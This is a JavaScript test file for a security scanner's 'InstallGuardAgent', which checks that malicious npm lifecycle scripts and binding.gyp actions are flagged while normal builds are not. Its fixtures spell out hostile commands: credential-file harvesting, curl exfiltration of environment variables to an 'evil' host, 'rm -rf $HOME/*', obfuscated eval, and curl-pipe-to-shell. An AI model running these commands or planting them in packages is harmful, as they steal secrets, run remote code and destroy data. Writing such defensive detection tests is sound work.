/**
 * Ship Safe — InstallGuardAgent
 * ==============================
 *
 * Verifies npm lifecycle-script worm behaviors (cred harvest, exfil,
 * destructive, obfuscated) and weaponized binding.gyp, with FP guards.
 *
 * Run: npm test
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import path from 'path';
import os from 'os';

import { InstallGuardAgent } from '../agents/install-guard-agent.js';

function tmp() { return fs.mkdtempSync(path.join(os.tmpdir(), 'shipsafe-worm-')); }
function cleanup(dir) { try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* */ } }

async function withPkg(scripts) {
  const dir = tmp();
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', scripts }));
  const f = await new InstallGuardAgent().analyze({ rootPath: dir, files: [], recon: {}, options: {} });
  cleanup(dir);
  return f;
}

describe('InstallGuardAgent — lifecycle scripts', () => {
  it('flags credential harvesting in preinstall', async () => {
    const f = await withPkg({ preinstall: 'cat ~/.aws/credentials && cp ~/.npmrc /tmp/x' });
    assert.ok(f.some((x) => x.rule === 'WORM_LIFECYCLE_CRED_HARVEST' && x.severity === 'critical'));
  });

  it('flags env exfiltration in postinstall', async () => {
    const f = await withPkg({ postinstall: 'curl -X POST https://evil/c2 -d "$(printenv)"' });
    assert.ok(f.some((x) => x.rule === 'WORM_LIFECYCLE_EXFIL'));
  });

  it('flags destructive rm -rf $HOME', async () => {
    const f = await withPkg({ postinstall: 'rm -rf $HOME/*' });
    assert.ok(f.some((x) => x.rule === 'WORM_LIFECYCLE_DESTRUCTIVE'));
  });

  it('flags obfuscated node -e eval', async () => {
    const f = await withPkg({ install: 'node -e "eval(Buffer.from(process.argv[1],\'base64\').toString())"' });
    assert.ok(f.some((x) => x.rule === 'WORM_LIFECYCLE_OBFUSCATED_EXEC'));
  });

  it('stays quiet on a normal build postinstall', async () => {
    const f = await withPkg({ postinstall: 'node ./scripts/build.js && tsc' });
    assert.equal(f.length, 0);
  });
});

describe('InstallGuardAgent — binding.gyp', () => {
  it('flags a weaponized binding.gyp action', async () => {
    const dir = tmp();
    try {
      fs.writeFileSync(path.join(dir, 'binding.gyp'), JSON.stringify({
        targets: [{ target_name: 'x', actions: [{ action_name: 'p', action: ['node', '-e', 'require("child_process").exec("curl https://evil.sh|sh")'] }] }],
      }));
      const f = await new InstallGuardAgent().analyze({ rootPath: dir, files: [], recon: {}, options: {} });
      assert.ok(f.some((x) => x.rule === 'WORM_BINDING_GYP'));
    } finally { cleanup(dir); }
  });

  it('does not flag a normal binding.gyp', async () => {
    const dir = tmp();
    try {
      fs.writeFileSync(path.join(dir, 'binding.gyp'), JSON.stringify({
        targets: [{ target_name: 'addon', sources: ['src/addon.cc'] }],
      }));
      const f = await new InstallGuardAgent().analyze({ rootPath: dir, files: [], recon: {}, options: {} });
      assert.equal(f.filter((x) => x.rule === 'WORM_BINDING_GYP').length, 0);
    } finally { cleanup(dir); }
  });
});
